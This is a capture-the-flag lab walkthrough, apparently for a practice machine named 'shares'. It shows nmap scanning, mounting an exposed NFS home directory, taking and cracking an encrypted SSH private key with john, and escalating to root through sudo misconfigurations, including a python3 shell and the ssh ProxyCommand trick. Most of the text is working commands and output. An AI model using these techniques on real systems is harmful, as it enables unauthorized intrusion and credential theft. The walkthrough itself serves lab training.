**[[nmap]] 'ip'**
```bash
sudo nmap -O -sV -v -A -p- 172.31.1.7
-O enables OS detection
-sV enable version detection
-v run in verbose mode displaying more detailed output
-A enables OS detection, version detection, script scanning and treaceroute
```

**scan revealed ports**
21/tcp ftp
80/tcp http
111/tcp rcpbind
2049/tcp nfs_acl
27853/tcp ssh
35737/tcp nlockmgr
46997/tcp mountd
51697/tcp mountd
60461/tcp mountd

**nfs foothold**
```bash
showmount -e 172.31.1.7
command shows the exported file systems of a remote NFS/network file system
-e displays the list of exported file systems from the remote NFS server
```
**showmount reveals**
/home/amir
```bash
~/cyberseclabs
mkdir shares
mkdir mnt
~/cyberseclabs/shares/mnt
sudo mount -t nfs 172.31.1.7:/home/amir mnt
cd mnt
┌──(kali㉿kali)-[~/cyberseclabs/shares/mnt]
└─$ ls -la  
total 40
drwxrwxr-x 5 kali kali 4096 Apr  2  2020 .
drwxr-xr-x 3 kali kali 4096 Jan 22 03:58 ..
-rw-r--r-- 1 kali kali    0 Apr  2  2020 .bash_history
-rw-r--r-- 1 kali kali  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kali kali 3786 Apr  2  2020 .bashrc
drw-r--r-- 2 kali kali 4096 Apr  2  2020 .cache
drw-r--r-- 3 kali kali 4096 Apr  2  2020 .gnupg
-rw-r--r-- 1 kali kali  807 Apr  4  2018 .profile
drwxrwxr-x 2 kali kali 4096 Apr  2  2020 .ssh
-rw-r--r-- 1 kali kali    0 Apr  2  2020 .sudo_as_admin_successful
-rw-r--r-- 1 kali kali 7713 Apr  2  2020 .viminfo
```
**.ssh is available in the mounted location**
```bash
┌──(kali㉿kali)-[~/cyberseclabs/shares/mnt/.ssh]
└─$ ls -la  
total 24
drwxrwxr-x 2 kali kali 4096 Apr  2  2020 .
drwxrwxr-x 5 kali kali 4096 Apr  2  2020 ..
-r-------- 1 kali kali  393 Apr  2  2020 authorized_keys
-r-------- 1 kali kali 1766 Apr  2  2020 id_rsa
-rw-r--r-- 1 kali kali 1766 Apr  2  2020 id_rsa.bak
-r-------- 1 kali kali  393 Apr  2  2020 id_rsa.pub
```
authkeys and id_rsa's in folder
```bash
┌──(kali㉿kali)-[~/cyberseclabs/shares/mnt/.ssh]
└─$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4nXVRpkSwugksnMc35UGjepRM1S0dsbZGvHBMr/SHKXX8xO6pwdrTHwCLQfycnJtKLw3Hg5tQ4Tb+R4GP/op/BfpnAFS5+l95iXJ1IK/auFNgFa4yAw6RwbibQEGguvMK74/ih1q8n8cWcN2Nd8n5sZt4N7/7MkyhJh5JRs6LPU83XLrgbGNNJbrAUwJOcCxxm6wmujSnlxy8t86YHgRtE2KQof1qmZNK9p/rjhcXQ8bAC++dQQ4Sck9JzV9rWc/Ao2UBN1tT5+Qrd9CJ7PFc9a1v9aevkiGJ0vkpRIq/nWsvrQa+dFtfmLWxx6zSP6AUUpmp+3pWKJnux3SwoIiT amir@shares
```
catting id_rsa reveals amir@shares
```bash
┌──(kali㉿kali)-[~/cyberseclabs/shares/mnt/.ssh]
└─$ cat id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,8D55B7449F8965162DA3B7F2F017FC21

2lI1tgSF61MjFg2Er22GWr9hImJbuZ01I556yFoLAGNj/95ZB2H8Er9u8wfMgr8z
uB8Yuw2GmO0jJguQ4CK36kDLT/hpG5AW5WfHASzePHx58Ol2hrH+2e5IAoIwcVmi
```
cp id_rsa.bak to host machine
specifically id_rsa.bak contains a rsa private key but it is encrypted and will need to use **john** to crack
```bash
┌──(kali㉿kali)-[~/cyberseclabs/shares]
└─$ ssh2john id_rsa.bak > hash.txt
┌──(kali㉿kali)-[~/cyberseclabs/shares]
└─$ cat hash.txt            
id_rsa.bak:$sshng$1$16$8D55B7449F8965162DA3B7F2F017FC21$1200$da5235b60485eb5323160d84af6d865abf6122625bb99d35239e7ac85a0b006363ffde590761fc12bf6ef307cc82bf33b81f18bb0d8698ed23260b90e022b7ea40cb4ff8691b9016e567c7012cde3c7c79f0
```
Then use 'john' to crack the hash - hello6
```bash
┌──(kali㉿kali)-[~/cyberseclabs/shares]
└─$ john --wordlist=/opt/rockyou.txt hash.txt                           
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hello6           (id_rsa.bak)     
1g 0:00:00:00 DONE (2023-01-28 06:31) 50.00g/s 1579Kp/s 1579Kc/s 1579KC/s ilovemarc..edward12
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Use the id-rsa.bak with the password (hello6) to login to amir
```bash
┌──(kali㉿kali)-[~/cyberseclabs/shares]
└─$ sudo ssh -i id_rsa.bak amir@172.31.1.7 -p 27853
The authenticity of host '[172.31.1.7]:27853 ([172.31.1.7]:27853)' can't be established.
ED25519 key fingerprint is SHA256:3v9jK3dqqfgI4jVyzYeJE+RsvhAjB3EEnGRZMDmgMP4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[172.31.1.7]:27853' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa.bak': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
```
use sudo -l to view the commands that amir can run as other users
```bash
amir@shares:~$ sudo -l
Matching Defaults entries for amir on shares:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User amir may run the following commands on shares:
    (ALL : ALL) ALL
    (amy) NOPASSWD: /usr/bin/pkexec
    (amy) NOPASSWD: /usr/bin/python3
```
searching gtfobins we  find a binary for sudo using python
sudo as user(-u) amy using /usr/bin/python3 then importing bash shell
```bash
amir@shares:/etc/cron.hourly$ sudo -u amy /usr/bin/python3 -c 'import os;os.system("/bin/bash")'
```
amy's home directory has a access.txt file with hash
```bash
amy@shares:/home/amy$ cat access.txt 
dc17a108efc49710e2fd5450c492231c
```
sudo -l reveals the ability to run sudo without a password from /usr/bin/ssh
```bash
amy@shares:/home/amy$ sudo -l
Matching Defaults entries for amy on shares:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User amy may run the following commands on shares:
    (ALL) NOPASSWD: /usr/bin/ssh
```
gtfobins for ssh reveals
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
- Spawn interactive root shell through ProxyCommand option.
```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

this gains root access and there is a file in /root with hash
```bash
# cd root
# pwd
/root
# ls -aslp
total 28
4 drwx------  3 root root 4096 Apr  2  2020 ./
4 drwxr-xr-x 24 root root 4096 Apr  2  2020 ../
4 -rw-------  1 root root   78 Apr  2  2020 .bash_history
4 -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
4 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4 drwx------  2 root root 4096 Apr  2  2020 .ssh/
4 -rw-r--r--  1 root root   33 Apr  2  2020 system.txt
# cat sys
cat: sys: No such file or directory
# cat system.txt
b910aca7fe5e6fcb5b0d1554f66c1506
# exit
ssh_exchange_identification: Connection closed by remote host
amy@shares:/usr/bin$ exit
exit
amir@shares:/etc/cron.hourly$ exit
logout
Connection to 172.31.1.7 closed.

┌──(kali㉿kali)-[~/cyberseclabs/shares]
└─$ 
```










